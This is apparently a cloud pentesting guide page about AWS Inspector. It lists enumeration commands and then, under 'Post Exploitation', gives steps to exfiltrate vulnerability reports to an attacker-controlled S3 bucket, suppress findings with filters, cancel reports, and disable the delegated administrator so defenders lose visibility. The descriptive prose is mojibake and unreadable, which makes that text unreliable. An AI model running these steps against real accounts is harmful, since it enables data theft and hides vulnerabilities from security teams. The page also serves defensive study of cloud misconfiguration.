* **Basic Scanning**: рдпрд╣ рдПрдХ рддреНрд╡рд░рд┐рдд рдФрд░ рд╣рд▓реНрдХрд╛ рд╕реНрдХреИрди рд╣реИ рдЬреЛ рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐рдпреЛрдВ рдореЗрдВ рдЬреНрдЮрд╛рдд OS рдкреИрдХреЗрдЬ рднреЗрджреНрдпрддрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдУрдкрди-рд╕реЛрд░реНрд╕ рдХреНрд▓реЗрдпрд░ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реЗ рдорд╛рдирдХ рдирд┐рдпрдореЛрдВ рдХреЗ рд╕реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╕реНрдХреИрдирд┐рдВрдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде, рдЖрдкрдХреЗ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЛ рдкреБрд╢ рдкрд░ рд╕реНрдХреИрди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдпрд╛ рдореИрдиреБрдЕрд▓ рд╕реНрдХреИрди рдХрд░рддреЗ рд╕рдордпред
* **Enhanced Scanning**: рдпрд╣ рд╡рд┐рдХрд▓реНрдк рдкреБрд╢ рд╕реНрдХреИрди рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдирд┐рд░рдВрддрд░ рд╕реНрдХреИрдирд┐рдВрдЧ рд╕реБрд╡рд┐рдзрд╛ рдЬреЛрдбрд╝рддрд╛ рд╣реИред Enhanced scanning рдкреНрд░рддреНрдпреЗрдХ рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐ рдХреА рдкрд░рддреЛрдВ рдореЗрдВ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЬрд╛рддреА рд╣реИ рддрд╛рдХрд┐ OS рдкреИрдХреЗрдЬреЛрдВ рдФрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ рдХреЗ рдкреИрдХреЗрдЬреЛрдВ рдореЗрдВ рднреЗрджреНрдпрддрд╛рдУрдВ рдХреА рдЙрдЪреНрдЪ рд╕рдЯреАрдХрддрд╛ рдХреЗ рд╕рд╛рде рдкрд╣рдЪрд╛рди рдХреА рдЬрд╛ рд╕рдХреЗред рдпрд╣ рдЖрдзрд╛рд░ рдЫрд╡рд┐ рдФрд░ рдХрд┐рд╕реА рднреА рдЕрддрд┐рд░рд┐рдХреНрдд рдкрд░рддреЛрдВ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЛрдВ рдХрд╛ рдПрдХ рд╡реНрдпрд╛рдкрдХ рджреГрд╢реНрдп рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

#### Amazon Lambda functions scanning

Amazon Inspector AWS Lambda рдХрд╛рд░реНрдпреЛрдВ рдФрд░ рдЗрд╕рдХреА рдкрд░рддреЛрдВ рдХреЗ рд▓рд┐рдП рд╡реНрдпрд╛рдкрдХ рд╕реНрдХреИрдирд┐рдВрдЧ рдХреНрд╖рдорддрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕рд░реНрд╡рд░ рд░рд╣рд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЕрдЦрдВрдбрддрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИред Inspector Lambda рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рджреЛ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реНрдХреИрдирд┐рдВрдЧ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

* **Lambda standard scanning**: рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реБрд╡рд┐рдзрд╛ рдЖрдкрдХреЗ Lambda рдХрд╛рд░реНрдп рдФрд░ рдкрд░рддреЛрдВ рдореЗрдВ рдЬреЛрдбрд╝реЗ рдЧрдП рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рднреЗрджреНрдпрддрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХрд╛ рдХрд╛рд░реНрдп рдХрд┐рд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ python-jwt рдЬрд┐рд╕рдореЗрдВ рдЬреНрдЮрд╛рдд рднреЗрджреНрдпрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рдирд┐рд╖реНрдХрд░реНрд╖ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред
* **Lambda code scanning**: рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЗрдВрдЬреЗрдХреНрд╢рди рджреЛрд╖, рдбреЗрдЯрд╛ рд▓реАрдХ, рдХрдордЬреЛрд░ рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлреА, рдФрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреА рдХрдореАред рдпрд╣ рдкрд╣рдЪрд╛рди рдХреА рдЧрдИ рднреЗрджреНрдпрддрд╛рдУрдВ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯреНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рд╣рд╛рд░реНрдбрдХреЛрдбреЗрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ред рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдореЗрдВ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╕реНрддреГрдд рд╕реБрдзрд╛рд░ рд╕реБрдЭрд╛рд╡ рдФрд░ рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

#### **Center for Internet Security (CIS) scans**

Amazon Inspector CIS рд╕реНрдХреИрди рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ Amazon EC2 рдЙрджрд╛рд╣рд░рдг рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЛ Center for Internet Security (CIS) рд╕реЗ рд╕рд░реНрд╡рд╢реНрд░реЗрд╖реНрда рдкреНрд░рдерд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдмреЗрдВрдЪрдорд╛рд░реНрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпреЗ рд╕реНрдХреИрди рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЙрджреНрдпреЛрдЧ-рдорд╛рдирдХ рд╕реБрд░рдХреНрд╖рд╛ рдмреБрдирд┐рдпрд╛рджреА рд░реЗрдЦрд╛рдУрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реИрдВред

* **Configuration**: CIS рд╕реНрдХреИрди рдпрд╣ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рд╕рд┐рд╕реНрдЯрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╡рд┐рд╢рд┐рд╖реНрдЯ CIS рдмреЗрдВрдЪрдорд╛рд░реНрдХ рд╕рд┐рдлрд╛рд░рд┐рд╢реЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рддреЗ рд╣реИрдВ, рдкреНрд░рддреНрдпреЗрдХ рдЬрд╛рдВрдЪ рдХреЛ рдПрдХ CIS рдЬрд╛рдВрдЪ рдЖрдИрдбреА рдФрд░ рд╢реАрд░реНрд╖рдХ рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред
* **Execution**: рд╕реНрдХреИрди рдЙрджрд╛рд╣рд░рдг рдЯреИрдЧ рдФрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╢реЗрдбреНрдпреВрд▓ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдпрд╛ рдЕрдиреБрд╕реВрдЪрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред
* **Results**: рд╕реНрдХреИрди рдХреЗ рдмрд╛рдж рдХреЗ рдкрд░рд┐рдгрд╛рдо рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реА рдЬрд╛рдВрдЪ рдкрд╛рд╕, рдЫреЛрдбрд╝ рджреА рдЧрдИ, рдпрд╛ рд╡рд┐рдлрд▓ рд╣реБрдИ, рдкреНрд░рддреНрдпреЗрдХ рдЙрджрд╛рд╣рд░рдг рдХреА рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### Post Exploitation

{% hint style="success" %}
рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рдпрд╣ рд╕реЗрд╡рд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕рдкреЛрдЬрд░ рдХреЛ рдЦреЛрдЬрдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреЛ рдЙрд╕реЗ рдЕрдиреНрдп рдЗрдВрд╕реНрдЯреЗрдВрд╕/рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреА рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╕реЗрд╡рд╛ рдХреЛ рдмрд╛рдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рднреА рд░реБрдЪрд┐ рд░рдЦ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреАрдбрд╝рд┐рдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ (рд╕рднреА рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ) рдХреЛ рди рджреЗрдЦ рд╕рдХреЗред
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдпрд╛ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдмрд┐рд▓ рдСрдл рдордЯреЗрд░рд┐рдпрд▓реНрд╕ (SBOMs) рдХреА рд╡рд┐рд╕реНрддреГрдд рд░рд┐рдкреЛрд░реНрдЯ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЖрдкрдХреЗ AWS рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдордЬреЛрд░рд┐рдпреЛрдВ, рдкреБрд░рд╛рдиреЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░, рдпрд╛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдирд┐рд░реНрднрд░рддрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд▓рдХреНрд╖рд┐рдд рд╣рдорд▓реЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
1. **рдПрдХ Amazon S3 рдмрдХреЗрдЯ рдмрдирд╛рдПрдВ** рдФрд░ рдЗрд╕реЗ рдПрдХ рдиреАрддрд┐ рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдВ рддрд╛рдХрд┐ рдпрд╣ рдкреАрдбрд╝рд┐рдд Amazon Inspector рд╕реЗ рд╕реБрд▓рдн рд╣реЛ:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **рдПрдХ Amazon KMS рдХреБрдВрдЬреА рдмрдирд╛рдПрдВ** рдФрд░ рдЗрд╕реЗ рдкреАрдбрд╝рд┐рдд рдХреЗ Amazon Inspector рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдиреАрддрд┐ рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдВ:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. **рдЦреЛрдЬ рд░рд┐рдкреЛрд░реНрдЯ** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ, рдЗрд╕реЗ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рддреЗ рд╣реБрдП:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╡рд┐рд╕реНрддреГрдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд░рд┐рдкреЛрд░реНрдЯреЛрдВ рдХреА рдкреАрдврд╝реА рдФрд░ рдирд┐рдХрд╛рд╕реА, рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ред

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд┐рд╖реНрдХрд░реНрд╖ рд░рд┐рдкреЛрд░реНрдЯ рдпрд╛ SBOM рд░рд┐рдкреЛрд░реНрдЯ рдХреА рдкреАрдврд╝реА рдХреЛ рд░рджреНрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдЯреАрдореЛрдВ рдХреЛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдмрд┐рд▓ рдСрдл рдордЯреЗрд░рд┐рдпрд▓реНрд╕ (SBOMs) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдордп рдкрд░ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рд╕реБрдзрд╛рд░ рдореЗрдВ рджреЗрд░реА рд╣реЛ рд╕рдХрддреА рд╣реИред
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдЧрд░рд╛рдиреА рдореЗрдВ рдмрд╛рдзрд╛ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЛрдВ рдХреА рд╕рдордп рдкрд░ рдкрд╣рдЪрд╛рди рдФрд░ рд╕реБрдзрд╛рд░ рдХреА рд░реЛрдХрдерд╛рдоред

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрди рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдирд┐рдпрдореЛрдВ рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реА рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЗ рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдпрд╛ рджрдмрд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ (рдпрджрд┐ **рдХреНрд░рд┐рдпрд╛** SUPPRESS рдкрд░ рд╕реЗрдЯ рдХреА рдЧрдИ рд╣реИ, рддреЛ рдПрдХ рджрдмрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдирд┐рдпрдо рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред рдЗрд╕рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдЫрд┐рдк рд╕рдХрддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЗрди рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рдмрд┐рдирд╛ рдкрд╣рдЪрд╛рди рдХреЗ рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдорд╣рддреНрд╡рдкреВрд░реНрдг рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдмрджрд▓рдХрд░ рдпрд╛ рд╣рдЯрд╛рдХрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЗ рд╕рд╛рде рд╕рд┐рд╕реНрдЯрдо рдХреЛ рднрд░рдХрд░ рд╢реЛрд░ рднреА рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рднрд╛рд╡реА рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдЧрд░рд╛рдиреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдмрд╛рдзрд╛ рдЖрддреА рд╣реИред
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдЫрд┐рдкрд╛рдирд╛ рдпрд╛ рджрдмрд╛рдирд╛, рдпрд╛ рдкреНрд░рдгрд╛рд▓реА рдХреЛ рдЕрдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рд╕реЗ рднрд░рдирд╛ред

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрди рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдмрд╛рдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

* рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рди рдЦрд╛рддрд╛ рдмрдВрдж рдХрд░рдиреЗ рдкрд░, рд╣рдорд▓рд╛рд╡рд░ рд╕реБрд░рдХреНрд╖рд╛ рдЯреАрдо рдХреЛ Amazon Inspector рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдФрд░ рд░рд┐рдкреЛрд░реНрдЯреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИред
